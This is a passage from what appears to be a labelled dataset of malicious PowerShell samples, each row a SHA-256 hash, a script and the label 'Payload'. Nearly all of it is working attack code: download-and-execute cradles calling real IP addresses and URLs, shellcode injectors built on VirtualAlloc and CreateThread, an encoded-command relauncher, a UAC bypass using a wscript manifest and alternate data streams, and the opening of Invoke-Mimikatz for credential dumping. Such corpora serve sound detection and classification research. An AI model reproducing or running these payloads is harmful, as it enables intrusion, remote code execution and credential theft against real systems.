    $link = $obj.CreateShortcut($LNKName)
    $link.WindowStyle = '7'
    $link.TargetPath = $EXEPath
    $link.HotKey = $HotKey
    $link.IconLocation = $IconPath
    $link.Arguments = $finalPayload
    $link.Save()
}
",Payload
f1512121377959327661adeee0f09c7bd82706e83a0b02871b4ab5787fb60160,"
$wC=New-OBJeCt SYstEM.NET.WEbClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeAdeRS.AdD('User-Agent',$u);$wc.PRoXy = [SYSTEm.Net.WEBReQUesT]::DEfaULTWeBPRoXy;$Wc.PROXY.CredeNtials = [SystEM.Net.CRedeNTIalCaCHe]::DeFAUlTNETWORkCRedenTiAls;$K='i54D$]SL~&cb>@uGq^Qn(<-`T{ZVtsz;';$i=0;[cHar[]]$B=([CHar[]]($WC.DOWnlOADStrIng(""http://52.36.245.145:8080/index.asp"")))|%{$_-bXOr$k[$I++%$k.LengtH]};IEX ($b-jOIn'')

",Payload
d2d70ccb2c2be6c0d07d420880270f8fe4aad8c0adc50dc2a826cec2383709a2,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x6e,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
4387e1a9aec419849f23201ecc4d4931e7cae61b876531f3af02828e4e2f42ba,"
(New-Object System.Net.WebClient).DownloadFile('http://www.pelicanlinetravels.com/images/xvcbkty.exe',""$env:TEMP\\xvcbkty.exe"");Start-Process (""$env:TEMP\\xvcbkty.exe"")

",Payload
5a0bd424fc66069836109042b9ed9cc077760b1df2ad649bd3a38970b22007fb,"
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/wopkwj.exe',""$env:TEMP\\drv.docx"");Start-Process (""$env:TEMP\\drv.docx"")

",Payload
4bbe2abe6160e4690cc43fad6c9caee5a447655b0ed3d3e25d9daef8359c8fbb,"
$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\\syswow64\\WindowsPowerShell\\v1.0\\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}

",Payload
686e7addb006e7fff39c7bb13c61511a25c537e6f3e66ed7f53f96c3933933c7,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0x01,0x0a,0x59,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
a6f70df333321d4ecd9591b917435b2e3f0861a74f7fd11418ee26d69b202292,"
$fqc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $fqc -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xe5,0xcb,0x19,0xa0,0xda,0xdf,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x83,0xe8,0xfc,0x31,0x70,0x0f,0x03,0x70,0xea,0x29,0xec,0x5c,0x1c,0x2f,0x0f,0x9d,0xdc,0x50,0x99,0x78,0xed,0x50,0xfd,0x09,0x5d,0x61,0x75,0x5f,0x51,0x0a,0xdb,0x74,0xe2,0x7e,0xf4,0x7b,0x43,0x34,0x22,0xb5,0x54,0x65,0x16,0xd4,0xd6,0x74,0x4b,0x36,0xe7,0xb6,0x9e,0x37,0x20,0xaa,0x53,0x65,0xf9,0xa0,0xc6,0x9a,0x8e,0xfd,0xda,0x11,0xdc,0x10,0x5b,0xc5,0x94,0x13,0x4a,0x58,0xaf,0x4d,0x4c,0x5a,0x7c,0xe6,0xc5,0x44,0x61,0xc3,0x9c,0xff,0x51,0xbf,0x1e,0xd6,0xa8,0x40,0x8c,0x17,0x05,0xb3,0xcc,0x50,0xa1,0x2c,0xbb,0xa8,0xd2,0xd1,0xbc,0x6e,0xa9,0x0d,0x48,0x75,0x09,0xc5,0xea,0x51,0xa8,0x0a,0x6c,0x11,0xa6,0xe7,0xfa,0x7d,0xaa,0xf6,0x2f,0xf6,0xd6,0x73,0xce,0xd9,0x5f,0xc7,0xf5,0xfd,0x04,0x93,0x94,0xa4,0xe0,0x72,0xa8,0xb7,0x4b,0x2a,0x0c,0xb3,0x61,0x3f,0x3d,0x9e,0xed,0x8c,0x0c,0x21,0xed,0x9a,0x07,0x52,0xdf,0x05,0xbc,0xfc,0x53,0xcd,0x1a,0xfa,0x94,0xe4,0xdb,0x94,0x6b,0x07,0x1c,0xbc,0xaf,0x53,0x4c,0xd6,0x06,0xdc,0x07,0x26,0xa7,0x09,0xbd,0x23,0x3f,0x77,0x8a,0x20,0x28,0x1f,0x09,0x39,0x43,0x53,0x84,0xdf,0x3b,0xc3,0xc7,0x4f,0xfb,0xb3,0xa7,0x3f,0x93,0xd9,0x27,0x1f,0x83,0xe1,0xed,0x08,0x29,0x0e,0x58,0x60,0xc5,0xb7,0xc1,0xfa,0x74,0x37,0xdc,0x86,0xb6,0xb3,0xd3,0x77,0x78,0x34,0x99,0x6b,0xec,0xb4,0xd4,0xd6,0xba,0xcb,0xc2,0x7d,0x42,0x5e,0xe9,0xd7,0x15,0xf6,0xf3,0x0e,0x51,0x59,0x0b,0x65,0xea,0x50,0x99,0xc6,0x84,0x9c,0x4d,0xc7,0x54,0xcb,0x07,0xc7,0x3c,0xab,0x73,0x94,0x59,0xb4,0xa9,0x88,0xf2,0x21,0x52,0xf9,0xa7,0xe2,0x3a,0x07,0x9e,0xc5,0xe4,0xf8,0xf5,0xd7,0xd9,0x2e,0x33,0xa2,0x33,0xf3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$jcq1=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($jcq1.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$jcq1,0,0,0);for (;;){Start-sleep 60};

",Payload
0ca11e161182e8c1f1f76b623ec59f73c638c5f819cdf4fd5e7302ef256678c7,"
$WC=NEw-OBjeCt SYsTEm.Net.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEAderS.Add('User-Agent',$u);$Wc.PROxY = [SystEM.NeT.WEBReQuEst]::DeFauLtWEbPrOxy;$wC.ProXY.CREdENtiAls = [System.NeT.CRedeNtIalCAcHe]::DefaulTNETworKCrEdenTIALS;$K='AKoem{;V*O$E^<0F:_Is~}zdhyni,fpt';$I=0;[CHAR[]]$b=([chAr[]]($wc.DOwNlOadSTRiNg(""https://108.61.211.36/index.asp"")))|%{$_-bXoR$k[$I++%$K.LenGtH]};IEX ($B-joIn'')

",Payload
711ceb13d26695254e5bcb413ee007c559ce0b023bf97356f6254cf8d49ed2f9,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xb5,0xae,0xb4,0x6e,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x52,0x31,0x50,0x12,0x03,0x50,0x12,0x83,0x75,0xaa,0x56,0x9b,0x89,0x5b,0x14,0x64,0x71,0x9c,0x79,0xec,0x94,0xad,0xb9,0x8a,0xdd,0x9e,0x09,0xd8,0xb3,0x12,0xe1,0x8c,0x27,0xa0,0x87,0x18,0x48,0x01,0x2d,0x7f,0x67,0x92,0x1e,0x43,0xe6,0x10,0x5d,0x90,0xc8,0x29,0xae,0xe5,0x09,0x6d,0xd3,0x04,0x5b,0x26,0x9f,0xbb,0x4b,0x43,0xd5,0x07,0xe0,0x1f,0xfb,0x0f,0x15,0xd7,0xfa,0x3e,0x88,0x63,0xa5,0xe0,0x2b,0xa7,0xdd,0xa8,0x33,0xa4,0xd8,0x63,0xc8,0x1e,0x96,0x75,0x18,0x6f,0x57,0xd9,0x65,0x5f,0xaa,0x23,0xa2,0x58,0x55,0x56,0xda,0x9a,0xe8,0x61,0x19,0xe0,0x36,0xe7,0xb9,0x42,0xbc,0x5f,0x65,0x72,0x11,0x39,0xee,0x78,0xde,0x4d,0xa8,0x9c,0xe1,0x82,0xc3,0x99,0x6a,0x25,0x03,0x28,0x28,0x02,0x87,0x70,0xea,0x2b,0x9e,0xdc,0x5d,0x53,0xc0,0xbe,0x02,0xf1,0x8b,0x53,0x56,0x88,0xd6,0x3b,0x9b,0xa1,0xe8,0xbb,0xb3,0xb2,0x9b,0x89,0x1c,0x69,0x33,0xa2,0xd5,0xb7,0xc4,0xc5,0xcf,0x00,0x5a,0x38,0xf0,0x70,0x73,0xff,0xa4,0x20,0xeb,0xd6,0xc4,0xaa,0xeb,0xd7,0x10,0x7c,0xbb,0x77,0xcb,0x3d,0x6b,0x38,0xbb,0xd5,0x61,0xb7,0xe4,0xc6,0x8a,0x1d,0x8d,0x6d,0x71,0xf6,0x1e,0x61,0x79,0x04,0x37,0x80,0x79,0x19,0x9b,0x0d,0x9f,0x73,0x33,0x58,0x08,0xec,0xaa,0xc1,0xc2,0x8d,0x33,0xdc,0xaf,0x8e,0xb8,0xd3,0x50,0x40,0x49,0x99,0x42,0x35,0xb9,0xd4,0x38,0x90,0xc6,0xc2,0x54,0x7e,0x54,0x89,0xa4,0x09,0x45,0x06,0xf3,0x5e,0xbb,0x5f,0x91,0x72,0xe2,0xc9,0x87,0x8e,0x72,0x31,0x03,0x55,0x47,0xbc,0x8a,0x18,0xf3,0x9a,0x9c,0xe4,0xfc,0xa6,0xc8,0xb8,0xaa,0x70,0xa6,0x7e,0x05,0x33,0x10,0x29,0xfa,0x9d,0xf4,0xac,0x30,0x1e,0x82,0xb0,0x1c,0xe8,0x6a,0x00,0xc9,0xad,0x95,0xad,0x9d,0x39,0xee,0xd3,0x3d,0xc5,0x25,0x50,0x4d,0x8c,0x67,0xf1,0xc6,0x49,0xf2,0x43,0x8b,0x69,0x29,0x87,0xb2,0xe9,0xdb,0x78,0x41,0xf1,0xae,0x7d,0x0d,0xb5,0x43,0x0c,0x1e,0x50,0x63,0xa3,0x1f,0x71;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
e2816b5af9b4732cba86f6c750ce5966a322cd3af4a8c5ae0d075c2830f8a8f4,"function Invoke-WScriptBypassUAC
{
    

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [string]
        $payload
    )

    function Local:Get-TempFileName {
        
        $sTempFolder = $env:Temp
        $sTempFolder = $sTempFolder + ""\\""
        $sTempFileName = [System.IO.Path]::GetRandomFileName() + "".tmp""
        $sTempFileName = $sTempFileName -split '\\.',([regex]::matches($sTempFileName,""\\."").count) -join ''
        $sTempFileNameFinal = $sTempFolder + $sTempFileName 
        return $sTempFileNameFinal
    }

    function Local:Invoke-CopyFile($sSource, $sTarget) {
       
       $sTempFile = Get-TempFileName
       Start-Process -WindowStyle Hidden -FilePath ""$($env:WINDIR)\\System32\\makecab.exe"" -ArgumentList ""$sSource $sTempFile""
       $null = wusa ""$sTempFile"" /extract:""$sTarget"" /quiet

       
       Start-Sleep -s 2
       
       
       Remove-Item $sTempFile
   }

    function Local:Invoke-WscriptTrigger {
        
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + "".vbs""
        $ADSFile = $VBSFileName -split '\\.',([regex]::matches($VBSFileName,""\\."").count) -join ''

        $VBSPayload = ""Dim objShell:""
        $VBSPayload += ""Dim oFso:""
        $VBSPayload += ""Set oFso = CreateObject(""""Scripting.FileSystemObject""""):""
        $VBSPayload += ""Set objShell = WScript.CreateObject(""""WScript.Shell""""):""
        $VBSPayload += ""command = """"$payload"""":""
        $VBSPayload += ""objShell.Run command, 0:""
        
        
        $DelCommand = ""$($env:WINDIR)\\System32\\cmd.exe /c """"""""start /b """""""""""""""" cmd /c """"""""timeout /t 5 >nul&&del $($env:WINDIR)\\wscript.exe&&del $($env:WINDIR)\\wscript.exe.manifest""""""""""""""""""
        $VBSPayload += ""command = """"$DelCommand"""":""
        $VBSPayload += ""objShell.Run command, 0:""
        $VBSPayload += ""Set objShell = Nothing""

        $CreateWrapperADS = {cmd /C ""echo $VBSPayload > """"$env:USERPROFILE\\AppData:$ADSFile""""""}
        Invoke-Command -ScriptBlock $CreateWrapperADS
        
        $ExecuteScript = {cmd /C ""$($env:WINDIR)\\wscript.exe """"$env:USERPROFILE\\AppData:$ADSFile""""""}
        Invoke-Command -ScriptBlock $ExecuteScript
        Remove-ADS $env:USERPROFILE\\AppData:$ADSFile
    }

    function Local:Invoke-WscriptElevate {

        $WscriptManifest =
@""
<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>
<assembly xmlns=""urn:schemas-microsoft-com:asm.v1""
          xmlns:asmv3=""urn:schemas-microsoft-com:asm.v3""
          manifestVersion=""1.0"">
  <asmv3:trustInfo>
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level=""RequireAdministrator"" uiAccess=""false""/>
      </requestedPrivileges>
    </security>
  </asmv3:trustInfo>
  <asmv3:application>
    <asmv3:windowsSettings xmlns=""http://schemas.microsoft.com/SMI/2005/WindowsSettings"">
      <autoElevate>true</autoElevate>
      <dpiAware>true</dpiAware>
    </asmv3:windowsSettings>
  </asmv3:application>
</assembly>
""@

        
        $sManifest = $env:Temp + ""\\wscript.exe.manifest""
        $WscriptManifest | Out-File $sManifest -Encoding UTF8

        Invoke-CopyFile $sManifest $env:WINDIR

        $WScriptPath = ""$($env:WINDIR)\\System32\\wscript.exe""
        Invoke-CopyFile $WScriptPath $env:WINDIR
        Remove-Item -Force $sManifest

        
        Invoke-WscriptTrigger
    }

    function Local:Remove-ADS {
        
        [CmdletBinding()] Param(
            [Parameter(Mandatory=$True)]
            [string]$ADSPath
        )
     
        
        
        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
     
        $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
            @('kernel32.dll'),
            [Reflection.FieldInfo[]]@($SetLastError),
            @($True))
     
        
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
            'kernel32.dll',
            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
            [Reflection.CallingConventions]::Standard,
            [Bool],
            [Type[]]@([String]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            [Runtime.InteropServices.CharSet]::Ansi)
        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
        
        $Kernel32 = $TypeBuilder.CreateType()
        
        $Result = $Kernel32::DeleteFile($ADSPath)

        if ($Result){
            Write-Verbose ""Alternate Data Stream at $ADSPath successfully removed.""
        }
        else{
            Write-Verbose ""Alternate Data Stream at $ADSPath removal failure!""
        }
    }

    
    $OSVersion = [Environment]::OSVersion.Version
    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))){
        if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator"") -eq $True){
            ""[!] WARNING: You are already elevated!""
        }
        else {
            Invoke-WscriptElevate
        }
    }else{""[!] WARNING: Target Not Vulnerable""}
}
",Payload
64d15412a96be1d1528b97e2839925bfc92e1230d895fa7eb143b7d6d46a05ca,"function Invoke-Mimikatz
{


[CmdletBinding(DefaultParameterSetName=""DumpCreds"")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,

    [Parameter(ParameterSetName = ""DumpCreds"", Position = 1)]
    [Switch]
    $DumpCreds,

    [Parameter(ParameterSetName = ""DumpCerts"", Position = 1)]
    [Switch]
    $DumpCerts,

    [Parameter(ParameterSetName = ""CustomCommand"", Position = 1)]
    [String]
    $Command
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		$PEBytes32,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,

        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        $ExeArgs
	)
	
	
	
	
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		
		
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		
		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
